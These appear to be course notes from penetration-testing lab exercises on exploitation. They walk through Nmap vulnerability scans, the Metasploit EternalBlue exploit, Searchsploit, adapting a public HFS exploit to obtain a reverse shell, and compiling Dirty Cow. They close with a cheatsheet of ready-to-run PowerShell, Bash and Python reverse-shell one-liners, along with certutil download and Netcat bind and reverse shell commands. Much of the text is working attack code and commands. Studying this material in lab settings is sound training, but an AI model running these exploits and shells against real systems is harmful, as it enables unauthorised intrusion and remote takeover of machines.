# Introduction

## Penetration Testing Phases

![grafik](https://github.com/user-attachments/assets/5d6c25a9-9920-4011-a243-fdfa17c5659b)

**Exploitation Methodology:**
- Identify Vulnerable Services
- Identify & Prepare Exploit Code
- Gaining Access
  - Automated - MSF
  - Manual
- Obtain remote access on target system.
- Bypass AV detection
- Pivot on to other systems

# Vulnerability Scanning

## Banner Grabbing

- Banner grabbing is an information gathering technique used by pentesters to enumerate information regarding the target operating system as well as the services that are running on its open ports.
- The primary objective of banner grabbing is to identify the service running on a specific port as well as the service version.
- Banner grabbing can be peformed through various techniques:
  - Performing a service version detection scan with Nmap.
  - Connecting to the open port with Netcat.
  - Authenticating with the service (If the service supports authentication), for example, SSH, FTP, Telnet etc.
 
## Demo: Banner Grabbing

`ls -al /usr/share/nmap/scripts/ | pgrep banner`

`nmap -sV --script=banner demo.ine.local`


#### Banner Grabbing with Netcat

`man nc`

`nc demo.ine.local 22`

`searchsploit openssh 7.2`

`ssh root@demo.ine.local`: gives us the ssh welcome banner. Could give us useful information.

## Vulnerability Scanning with Nmap Scripts

**nmap.org**
# Vulnerability Scanning with Nmap Scripts

## Overview

## Demo: Vulnerability Scanning with Nmap Scripts

### Step-by-Step Process

Perform a basic Nmap service and OS detection scan on the target:

```bash
nmap -sV -O demo.ine.local
```

### Vulnerability Detection Scans

Nmap scripts are stored in the following directory:

```bash
ls -al /usr/share/nmap/scripts/
```

To limit the results and search for scripts related to HTTP:

```bash
ls -al /usr/share/nmap/scripts/ | grep http
```

Run an Nmap scan with the **http-enum** script, which enumerates common web application files and directories:

```bash
nmap -sV -p 80 --script=http-enum demo.ine.local
```

### Finding Exploits with Searchsploit

Search for available exploits related to **Apache 2.4.6** using **Searchsploit**:

```bash
searchsploit apache 2.4.6
```

### Creating / Editing a Nmap Script

You can create or edit an existing Nmap script using a text editor such as `nano`. For example, to edit the **http-enum** script:

```bash
nano /usr/share/nmap/scripts/http-enum.nse
```

### Utilizing Nmap Scripts for Specific Services

To list vulnerability detection scripts, use the following command:

```bash
ls -al /usr/share/nmap/scripts/ | grep vuln
```

We want to check if the target is vulnerable to the **shellshock** vulnerability. First, list the relevant scripts:

```bash
ls -al /usr/share/nmap/scripts/ | grep shellshock
```

Run an Nmap scan with the **http-shellshock** script on port 80:

```bash
nmap -sV -p 80 --script=http-shellshock demo.ine.local
```

### Analyzing a Web Application Vulnerability

We check the website and the source code and discover that it runs a script for a **dynamic timer**. We try to access the **gettime.cgi** script on the target:

```bash
http://demo.ine.local/gettime.cgi
```

Now, we check if the **gettime.cgi** file is vulnerable to the **shellshock** vulnerability by running the **http-shellshock** script with additional arguments:

```bash
nmap -sV -p 80 --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" demo.ine.local
```

### Conclusion

What we accomplished:
- Ran a basic **Nmap scan** to detect services and the OS on the target.
- Explored where **Nmap scripts** are stored and how to filter and use specific scripts.
- Used the **http-enum** script to enumerate directories on a web server.
- Performed a **shellshock** vulnerability scan on the target by utilizing Nmap scripts.
- Analyzed a potential **web application vulnerability** by interacting with the web server and targeting specific scripts.

This demonstrates how to use Nmap's scripting engine for vulnerability scanning and how to customize and utilize specific scripts to find vulnerabilities in web applications.


Note: `ls al /usr/share/nmap/Scripts/ | grep ftp` to look for ftp scripts
# Vulnerability Scanning with Metasploit

## Overview

- **Metasploit**: A popular penetration testing framework that allows security researchers and penetration testers to discover, exploit, and validate vulnerabilities in a target system.
- **Goal**: In this demo, we will identify a vulnerability (MS17-010, also known as EternalBlue) on a target system, and use Metasploit to exploit it.

## Demo: Vulnerability Scanning with Metasploit

### Step-by-Step Process

### Initial Nmap Scan

We start with an Nmap scan to identify open ports and services running on the target system:

```bash
nmap -sS -sV demo.ine.local
```

### Searching for EternalBlue Vulnerability

After identifying that the system might be running an SMB service, we use **Searchsploit** to check for the **EternalBlue** vulnerability and **MS17-010** exploits:

```bash
searchsploit EternalBlue
searchsploit ms17-010
```

### Launching Metasploit

Start Metasploit:

```bash
msfconsole
```

### Searching for the EternalBlue Module

Search for the **EternalBlue** auxiliary and exploit modules in Metasploit:

```bash
search eternalblue
```

### Using the SMB MS17-010 Scanner

To verify if the target system is vulnerable, use the **SMB MS17-010 vulnerability scanner**:

```bash
use auxiliary/scanner/smb/smb_ms17_010
```

Show the available options for the module:

```bash
show options
```

Set the target IP address:

```bash
set rhosts [targetIP]
```

Run the vulnerability scan:

```bash
run
```

The scanner checks if the target is vulnerable and retrieves OS information.

### Exploiting EternalBlue Vulnerability

Now that we've confirmed the target is vulnerable, use the **EternalBlue exploit** module:

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

Set the target IP address again:

```bash
set rhosts [targetIP]
```

Run the exploit:

```bash
run
```

### Post-Exploitation

Once the exploit runs successfully, we can interact with the compromised system. Retrieve system information using the **sysinfo** command:

```bash
sysinfo
```

### Conclusion

What we accomplished:
- Performed an **Nmap scan** to detect open ports and services on the target.
- Used **Searchsploit** to identify the **EternalBlue** vulnerability (MS17-010).
- Launched Metasploit and used the **SMB vulnerability scanner** to confirm that the target was vulnerable to EternalBlue.
- Successfully exploited the target using the **MS17-010 EternalBlue** exploit.
- Gathered post-exploitation information, such as system details, from the compromised machine.

This demonstration highlights how Metasploit can be used to perform vulnerability scanning and exploitation of known vulnerabilities in a target system.

# Exploits - Searching for Exploits

## Searching for Publicy Available Exploits

**- ExploitDB**
**- Rapid7**

# Searching for Exploits with Searchsploit

## Overview

- **Searchsploit**: A command-line tool for searching through the **ExploitDB** database, which contains public exploits and proof-of-concept code for known vulnerabilities.
- **Goal**: In this demo, we will explore how to use **Searchsploit** to find and copy relevant exploits for various vulnerabilities on different systems.

## Demo: Searching for Exploits with Searchsploit

### Updating the ExploitDB Package

First, ensure that your ExploitDB package is updated to have the latest exploits:

```bash
sudo apt-get update && sudo apt-get install exploitdb -y
```

List the contents of the **ExploitDB directory** to verify installation:

```bash
ls -al /usr/share/exploitdb
```

You can also list exploits for specific platforms, such as Windows:

```bash
ls -al /usr/share/exploitdb/exploits/windows/[TAB]
```

### Basic Searchsploit Commands

Launch **Searchsploit**:

```bash
searchsploit
```

Update the local **ExploitDB** repository:

```bash
searchsploit -u
```

### Searching for Specific Exploits

For example, search for **vsftpd** exploits:

```bash
searchsploit vsftpd
```

### Copying an Exploit into the Current Directory

To copy an exploit to your current working directory for further examination, use the **-m** option with the **exploit ID**:

```bash
searchsploit -m [exploitID]
```

Check if the exploit has been copied successfully:

```bash
ls -al
```

Open the exploit for editing or reviewing:

```bash
vim [exploitID]
```

### Searchsploit Search Options

#### Case-Sensitive Search

Use the **-c** option to make searches case-sensitive. For example:

```bash
searchsploit -c OpenSSH
```

#### Title Search

To perform a search based on the exploit's title, use the **-t** option:

```bash
searchsploit -t vsftpd
searchsploit -t Buffer Overflow
```

#### Exact Search

To perform an **exact match search**, use the **-e** option. For example, search for exploits targeting **Windows XP** or **OpenSSH** versions:

```bash
searchsploit -e "Windows XP" | grep -e "Microsoft"
searchsploit -e "OpenSSH 7.2p2"
```

### Searching for Exploits by Parameters

Search for exploits that match certain parameters. For example, to search for remote buffer overflow vulnerabilities in Windows:

```bash
searchsploit remote windows buffer
```

Or for SSH-related vulnerabilities in Linux:

```bash
searchsploit remote linux ssh
```

#### Example 1: Wordpress Exploits

We identified a web server running Wordpress and are looking for **remote Wordpress exploits**:

```bash
searchsploit remote webapps wordpress
```

#### Example 2: Windows Privilege Escalation Exploits

To search for **local privilege escalation exploits** for Windows:

```bash
searchsploit local windows | grep -e "Microsoft"
```

### Obtaining Exploit Links

You can obtain the **link** to a specific exploit from ExploitDB using the **-w** option. For example, search for EternalBlue exploits:

```bash
searchsploit remote windows smb -w | grep -e "EternalBlue"
```

### Copying an Exploit Manually

You can also manually copy an exploit from the **ExploitDB** directory to your current working directory. For example, copying the EternalBlue Python exploit:

```bash
sudo cp /usr/share/exploitdb/exploits/windows/remote/42031.py .
```

### Conclusion

What we accomplished:
- Updated the **ExploitDB** package and used **Searchsploit** to search for and copy relevant exploits.
- Learned how to perform **exact searches**, **case-sensitive searches**, and how to search for **specific parameters**.
- Demonstrated how to copy exploits for further testing or modification.

This demo illustrates how **Searchsploit** can be a valuable tool in identifying and utilizing publicly available exploits for penetration testing and security research.

# Fixing Exploits

# Fixing Exploits (Demo)

## Overview

- **Fixing Exploits**: Sometimes, an exploit doesn't work out-of-the-box due to factors like IP mismatches, wrong port configurations, or outdated scripts. In such cases, we need to modify the exploit to fit our environment.
- **Goal**: In this demo, we will identify a vulnerable **HTTP File Server (HFS)**, use **Searchsploit** to find an appropriate exploit, fix it by modifying the configuration, and successfully execute it to gain a reverse shell.

## Demo: Fixing and Executing Exploits

### Step-by-Step Process

### Initial Scan

Check network configuration:

```bash
ifconfig
```

Perform an Nmap service version scan on the target:

```bash
nmap -sV demo.ine.local
```

### Identifying Vulnerability

We notice that **HFS (HTTP File Server)** is running on the target. By typing the target's IP address in the browser, we can view the **file server version** and the **name**.

### Searching for Exploits

Search for an exploit related to **HTTP File Server 2.3** using **Searchsploit**:

```bash
searchsploit HTTP File Server 2.3
```

### Copying the Exploit Locally

Change directory to the Desktop:

```bash
cd Desktop/
```

Use **Searchsploit** to copy the relevant exploit to the local machine:

```bash
searchsploit -m 39161
```

### Editing the Exploit

Open the exploit script in a text editor for modification:

```bash
vim 39161.py
```

In the exploit script, we need to modify the **author's IP address** and **port** to our own IP and preferred listening port.

### Setting Up Environment

#### Step 1: Setting Up a Web Server

We need to set up a **SimpleHTTPServer** to host a binary for download. In the first terminal, copy the **netcat binary** to your current working directory and start the web server:

```bash
cp /usr/share/windows-resources/binaries/nc.exe .
python -m SimpleHTTPServer 80
```

This sets up a simple web server on port 80, hosting the **nc.exe** file (Netcat).

#### Step 2: Setting Up a Netcat Listener

In a second terminal, set up the **Netcat listener** on the port specified in the exploit (in this case, port 1234):

```bash
nc -nvlp 1234
```

This will listen for incoming connections from the target system.

#### Step 3: Executing the Exploit

In the third (original) terminal, where we edited the exploit, execute the modified exploit script:

```bash
python 39161.py demo.ine.local 80
```

The exploit will make GET requests to download **nc.exe** from our web server.

### Debugging the Exploit

If the exploit does not work on the first try (i.e., you do not receive a reverse shell on the **Netcat listener**), carefully review the exploit documentation. Common issues include:
- Incorrect IP address or port configurations.
- A need to re-execute the exploit as instructed in the exploit's comments.

Re-execute the exploit after fixing the issues.

### Post-Exploitation

Once the exploit is successful, you should receive a **reverse shell** on your Netcat listener. Check for administrative access by running the following commands:

```bash
whoami
systeminfo
```

At this point, you should have full administrative access to the target system.

### Conclusion

What we accomplished:
- Identified a vulnerable **HTTP File Server** (HFS) running on the target.
- Used **Searchsploit** to find an appropriate exploit.
- Modified the exploit by changing the IP address and port to match our environment.
- Set up a **SimpleHTTPServer** to host the **Netcat** binary and used **Netcat** to listen for incoming connections.
- Successfully executed the exploit and gained a **reverse shell** with administrative privileges.

This demonstration illustrates how to troubleshoot and fix exploits when they don’t work initially, ensuring successful exploitation of the target system.

## Cross-Compiling Exploits

- In certain cases, exploit code will be developed in C/C++/C#, as a result, you will need to compile the exploit code in to a PE (Portable Executable) or binary.
- Cross-Compiling is the process of compiling code for a platform other than the one performing the compilation.
- As a penetration tester, you will need to have the skills necessary to compile exploit code developed in C.

## Demo: Cross-Compiling Exploits

 **Goal**: In this demo, we will cross-compile exploits for both Windows and Linux using **Mingw-w64** and **GCC**.

### Step-by-Step Process

### Installing Required Tools

Install **Mingw-w64** for cross-compiling and **GCC** for compiling C exploits on Linux:

```bash
sudo apt-get install mingw-w64
sudo apt-get install gcc
```

### Searching for Exploits with Searchsploit

Search for an exploit for **VideoLAN VLC** (SMB-related):

```bash
searchsploit VideoLAN VLC SMB
```

Copy the exploit to the local machine for modification:

```bash
searchsploit -m 9303
```

List the files in the current directory to confirm the copy:

```bash
ls
```

Open the copied exploit code for editing or reviewing:

```bash
vim 9303.c
```

### Cross-Compiling the Exploit for Windows

We will now use **Mingw-w64** to cross-compile the C exploit for Windows. To compile it for 64-bit Windows systems:

```bash
i686-w64-mingw32-gcc 9303.c -o exploit
```

Check if the exploit was compiled successfully:

```bash
ls
```

### Compiling for 32-bit Windows Systems

To compile the same exploit for 32-bit systems and link it with the **Ws2_32** library (used for networking functions):

```bash
i686-w64-mingw32-gcc 9303.c -o exploit -lws2_32
```

Check if the exploit was successfully compiled:

```bash
ls
```

### Compiling Linux Exploits Written in C

We can also compile exploits targeting Linux systems. For example, we will search for and compile the famous **Dirty Cow** exploit.

Search for **Dirty Cow** exploits using **Searchsploit**:

```bash
searchsploit Dirty Cow
```

Copy the exploit code to the local machine:

```bash
searchsploit -m 40839
```

### Compiling Linux Exploit

Compile the **Dirty Cow** exploit for Linux using **GCC**, and include necessary libraries such as **pthread** and **crypt**:

```bash
gcc -pthread 40839.c -o exploit -lcrypt
```

Check if the exploit was successfully compiled:

```bash
ls
```

### OffSec Binsploits

The **ExploitDB bin-sploits** repository contains a list of precompiled binaries for various platforms and can be useful for testing exploits directly.

### Conclusion

What we accomplished:
- Installed the required tools (**Mingw-w64** and **GCC**) for cross-compiling exploits.
- Used **Searchsploit** to search for and retrieve exploits.
- Cross-compiled an exploit targeting **Windows** for both 32-bit and 64-bit systems.
- Compiled a well-known **Linux** exploit (**Dirty Cow**) using **GCC**.
- Learned about **OffSec bin-sploits**, which contains precompiled exploits for easier testing.

This demo showcases the steps for cross-compiling exploits for different platforms, helping penetration testers adapt exploits to various environments.

# Bind & Reverse Shells

## Netcat Fundamentals

- Netcat (Aka TCP/IP Swiss Army Knife) is a networking utility used to read and write data to network connections using TCP or UDP.
- Netcat utilizes a client-server communication architecture with two models:
  - Client mode - connect to any TCP/UDP port as well as a Netcat listener (server).
  - Server mode - Netcat can be used to listen for connections from clients on a specific port.
 
- Netcat can be used by pentesters to perform the following functionality:
  - Banner Grabbing
  - Port Scanning
  - Transferring Files
  - Bind/Reverse Shells

# Netcat Fundamentals (Demo)

## Overview

- **Netcat (nc)**: A versatile networking tool used for reading from and writing to network connections using TCP or UDP. It can be used for various purposes, such as port scanning, setting up listeners, creating reverse shells, and file transfers.
- **Goal**: In this demo, we will explore the fundamental uses of Netcat, including connecting to ports, setting up listeners, and transferring files.

## Demo: Netcat Fundamentals

### Step-by-Step Process

### Checking Netcat Documentation

To view the manual page for Netcat, use the following command:

```bash
man nc
```

### Connecting to Ports

We can connect to a specific port on the target system. Here, we attempt to connect to port 80 (HTTP) on the target:

```bash
nc demo.ine.local 80
```

Since no output is received, we use additional flags to disable DNS resolution (`-n`) and enable verbose output (`-v`):

```bash
nc -nv demo.ine.local 80
```

For connecting to a UDP port (in this case, port 139), use:

```bash
nc -nvu demo.ine.local 139
```

### Setting Up a Listener on a Port

To set up a listener on a specific port, we first need to transfer the **Netcat executable** to the target system.

#### Transferring Netcat Executable to Windows System

On Kali Linux, the **Netcat executable** is stored under `/usr/share/windows-binaries/`. List the files in the directory:

```bash
ls -al /usr/share/windows-binaries/
cd /usr/share/windows-binaries/
```

We can share these files on a **SimpleHTTPServer** running on port 80:

```bash
python -m SimpleHTTPServer 80
```

On the target Windows system, download the **nc.exe** file using the **certutil** command:

```bash
certutil -urlcache -f http://[eth1]/nc.exe nc.exe
```

Verify that the **Netcat executable** is working:

```bash
nc.exe -help
```

### Setting Up a Listener on Kali

Now, set up a **Netcat listener** on the **Kali machine** to listen on port 1234:

```bash
nc -nvlp 1234
```

### Connecting to the Listener from Windows

On the **Windows system**, use Netcat to connect to the listener running on the Kali machine:

```bash
nc.exe -nv demo.ine.local 1234
```

Once connected, test if the connection is working by sending a message, e.g., "Hello". The message should appear on the Kali machine.

### Setting Up a Listener on Windows

Now, we can reverse the setup and set up a listener on the **Windows system**:

```bash
nc.exe -nvlp 1234
```

On the **Kali machine**, connect to the Windows listener:

```bash
nc -nv demo.ine.local 1234
```

### Setting Up a Netcat Listener on a UDP Port

Netcat can also listen on **UDP** ports. To set up a listener on a UDP port:

```bash
nc -nvlup demo.ine.local 1234
```

On the **Windows system**, use the following command to connect to the UDP listener on the **Kali machine**:

```bash
nc.exe -nvu [eth1] 1234
```

### Transferring Files with Netcat

Netcat can be used to transfer files between systems. The receiving system needs to set up a **Netcat listener** first.

#### Step 1: Create a File to Transfer

On the **Kali machine**, create a text file:

```bash
vim test.txt
```

Add some content, e.g., "This was sent over with Netcat".

#### Step 2: Set Up a Listener to Receive the File

On the **Windows system**, set up a listener that will receive the file:

```bash
nc.exe -nvlp 1234 > test.txt
```

#### Step 3: Send the File from Kali

On the **Kali machine**, send the file to the Windows listener:

```bash
nc -nv demo.ine.local 1234 < test.txt
```

Once the file transfer is complete, the content of **test.txt** will be available on the **Windows system**.

### Conclusion

What we accomplished:
- Learned how to use **Netcat** to connect to specific ports on a target system using both TCP and UDP.
- Set up listeners on both **Kali** and **Windows** systems to facilitate reverse connections.
- Used **Netcat** to transfer files between the **Kali** and **Windows** systems.
- Verified that **Netcat** can be used for basic networking tasks, including port scanning, file transfer, and setting up listeners.

This demo highlights the fundamental uses of **Netcat** in various network operations and penetration testing scenarios.

## Bind Shells

- A bind shell is a type of remote shell where the attacker connects directly to a listener on the target system, consequently allowing for execution of commands on the target system.
- A Netcat listener can be setup to execute a specific executable like cmd.exe or /bin/bash when a client connects to the listener.

![grafik](https://github.com/user-attachments/assets/bddbbb6a-39d6-4843-b552-60c79d8ebb3e)

## Demo: Setting Up a Reverse Shell with Netcat

### Step-by-Step Process

### Step 1: Setting Up the Web Server on Kali

First, we need to host the **Netcat executable** on a **SimpleHTTPServer** so that the target **Windows system** can download it. 

Navigate to the directory where the **Netcat executable** is stored on **Kali**:

```bash
cd /usr/share/windows-binaries
```

List the contents of the directory to confirm the presence of **nc.exe**:

```bash
ls -al
```

Now, set up the web server using **Python** to serve files over **HTTP** on port 80:

```bash
python -m SimpleHTTPServer 80
```

### Step 2: Downloading Netcat on the Target Windows System

On the **Windows system**, open a web browser and navigate to the **Kali Linux IP address** to download **nc.exe**. Alternatively, you can use the command line with **certutil** to download the file.

After downloading the **Netcat executable**, navigate to the **Downloads** folder:

```cmd
cd Downloads
```

List the files to verify the download:

```cmd
dir
```

### Step 3: Setting Up a Reverse Shell on the Windows System

Use **Netcat** to set up a **reverse shell** from the **Windows system** back to the **Kali machine**. This command will bind **cmd.exe** to the connection, allowing you to control the **Windows** machine remotely. Run this command on the **Windows system**:

```cmd
nc.exe -nv [kaliIP] 1234 -e cmd.exe
```

This command connects to the **Kali machine's** IP on port 1234 and redirects input/output to **cmd.exe**, creating a reverse shell.

### Step 4: Setting Up a Listener on Kali

Now, on your **Kali Linux** system, set up a **Netcat listener** to receive the incoming connection from the **Windows machine**. Use the following command:

```bash
nc -nvlp 1234 -c /bin/bash
```

- **-n**: No DNS resolution.
- **-v**: Verbose mode to show more details.
- **-l**: Listen for incoming connections.
- **-p 1234**: Specify the listening port (1234).
- **-c /bin/bash**: Pass commands to **/bin/bash** once a connection is made, so you can interact with the shell.

### Step 5: Receiving the Reverse Shell

Once the reverse shell is successfully established, you can execute commands on the **Windows system** from your **Kali Linux** terminal. For example:

```bash
whoami
ls
```

These commands will execute on the **Windows system**, and the results will be displayed on your **Kali machine**.

### Setting Up a Bind Shell

In addition to a reverse shell, you can also set up a **bind shell** where the **Windows system** listens on a port and the **Kali system** connects to it. Follow these steps:

#### Step 1: Setting Up the Bind Shell on Windows

Run the following command on the **Windows system** to set up a listener on port 1234 and bind **cmd.exe**:

```cmd
nc.exe -nvlp 1234 -e cmd.exe
```

This sets up a listener on **Windows** and binds it to the **cmd.exe** shell.

#### Step 2: Connecting to the Bind Shell from Kali

On the **Kali Linux** system, connect to the **Windows machine** using **Netcat**:

```bash
nc -nv demo.ine.local 1234
```

Once connected, you can execute commands like:

```bash
ls
whoami
```

### Conclusion

What we accomplished:
- Set up a web server on **Kali Linux** to host the **Netcat executable** for the target **Windows system**.
- Downloaded **Netcat** on the **Windows system** and used it to create both a **reverse shell** and a **bind shell**.
- Set up a **Netcat listener** on **Kali** to receive the reverse shell connection from **Windows**.
- Successfully executed commands on the **Windows system** remotely from **Kali Linux**.
- Configured a **bind shell** that allows **Kali** to connect to **Windows** and control it.

This demo illustrates how **Netcat** can be used to create both **reverse shells** and **bind shells** between a **Windows target** and a **Kali machine**, facilitating remote access and control.

## Reverse Shells

- A reverse shell is a type of remote shell where the target connects directly to a listener on the attacker's system, consequently allowing for execution of commands on the target system.

![grafik](https://github.com/user-attachments/assets/3e3bf864-8f53-44b1-a296-71a513343b47)

## Step-by-Step Process

### Step 1: Transferring Netcat to the Target System

First, we need to transfer the **Netcat executable** (`nc.exe`) to the target **Windows system**. If the executable is already on the **Windows system**, navigate to the directory where it is located.

On the **Windows system**:

```cmd
C:\Users\Administrator\Desktop>dir
```

Verify that **nc.exe** is present in the directory.

### Step 2: Setting Up the Reverse Shell Listener on Kali

On the **Kali Linux** system (the attacker's machine), set up a **Netcat listener** to wait for an incoming connection from the target system. This listener will capture the reverse shell once it's established.

In the terminal on **Kali**, run the following command to set up the listener on port 1234:

```bash
nc -nvlp 1234
```

- **-n**: No DNS resolution.
- **-v**: Verbose mode to provide detailed output.
- **-l**: Listen for an incoming connection.
- **-p 1234**: Specify port 1234 for the connection.

### Step 3: Initiating the Reverse Shell on the Target (Windows)

On the **Windows system**, use **Netcat** to initiate a reverse shell. This command tells the **Windows system** to connect to the **Kali machine** on port 1234 and redirect input/output to the **cmd.exe** shell:

```cmd
nc.exe -nv [AttackerIP] 1234 -e cmd.exe
```

- **-nv**: Disable DNS resolution and use verbose mode.
- **[AttackerIP]**: Replace this with the IP address of the **Kali machine**.
- **1234**: The port number we are using for the listener on **Kali**.
- **-e cmd.exe**: Execute the **cmd.exe** shell and bind it to the connection.

### Step 4: Verifying the Reverse Shell on Kali

After the reverse shell is successfully established, you should be able to control the **Windows system** from the **Kali machine**. For example, you can run commands such as:

```bash
whoami
```

This command will return the username of the current user on the **Windows system**.

You can also list the contents of the current directory:

```bash
dir
```

We create a file on the target via the reverse shell connection:

```bash
cd Desktop
ECHO *YOU HAVE BEEN HACKED" > hacked.txt
```

### Conclusion

What we accomplished:
- Transferred **Netcat** to the **Windows system**.
- Set up a **Netcat listener** on **Kali Linux** to wait for a reverse shell connection.
- Used **Netcat** on the **Windows system** to initiate a reverse shell back to the **Kali machine**.
- Successfully executed commands on the **Windows system** remotely from **Kali Linux**.

This demo shows how to use **Netcat** to create a **reverse shell** between a **Windows system** and a **Kali Linux** machine, allowing for remote control and command execution.

# Reverse Shell Cheatsheet

## Overview

- **Reverse Shells**: A reverse shell is a type of shell where the target system connects back to the attacker's machine, allowing remote control of the target.
- **Tools**: While **Netcat** is commonly used to establish reverse shells, it is not the only option. Reverse shells can also be set up using **PowerShell**, **Bash**, **Python**, and other scripting languages, without needing **Netcat** on the target system.
  
## Alternative Methods to Netcat for Reverse Shells

- We do not always need to rely on **Netcat** on the target system. Reverse shell connections can be made using various scripting languages and commands.
- Resources like **GitHub** and **revshells.com** provide pre-built scripts for different environments, allowing us to manually insert or automate these into payloads to connect back to a **Netcat listener**.

### Key Resources:
- **GitHub**: The repository at `swisskyrepo/PayloadAllTheThings/Methodology and Resources/Reverse Shell Cheatsheet.md` contains ready-to-use reverse shell code snippets for various languages and systems. This code can be executed on the target system or integrated into exploit payloads.
- **revshells.com**: This website allows you to easily copy reverse shell code, which can be inserted into scripts or executed directly on the target system.

## Reverse Shell Setup Process

### Step 1: Setting Up a Netcat Listener on the Attacker's Machine

Before executing reverse shell code on the target, we need to set up a **Netcat listener** on the attacker's machine. This listener will wait for the incoming connection from the target system.

Example on **Kali Linux**:

```bash
nc -nvlp 1234
```

This command will set up a **Netcat listener** on port 1234, ready to receive the reverse shell connection.

### Step 2: Executing the Reverse Shell Code on the Target

On the target system, execute the appropriate reverse shell code for your environment. Below are examples for various environments:

#### PowerShell Reverse Shell

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("[AttackerIP]",1234);$stream = $client.GetStream();[byte[]]$buffer = 0..65535|%{0};while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

#### Bash Reverse Shell

```bash
bash -i >& /dev/tcp/[AttackerIP]/1234 0>&1
```

#### Python Reverse Shell

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[AttackerIP]",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

### Step 3: Obtaining the Reverse Shell

Once the reverse shell code is executed on the target, you should receive a connection on your **Netcat listener**. Now, you can execute commands on the target system from your attacking machine.

For example:

```bash
whoami
```

```bash
ls
```

These commands will execute on the target machine, and the output will be returned to your **Netcat listener**.

## Useful Resources
- **GitHub** Repository: [`swisskyrepo/PayloadAllTheThings`](https://github.com/swisskyrepo/PayloadAllTheThings) – Contains various reverse shell code snippets and methodologies for different environments.
- **revshells.com**: A quick and easy way to generate reverse shell scripts for various scenarios. You can copy the generated code and paste it into a script or execute it directly.

## Conclusion

With **reverse shells**, we don't always need to rely on **Netcat** being present on the target system. By leveraging scripts in **PowerShell**, **Bash**, **Python**, and more, we can establish reverse shells and gain remote access. Resources such as **PayloadAllTheThings** on GitHub and **revshells.com** provide ready-to-use code that can be manually executed or integrated into payloads to facilitate reverse shell connections.









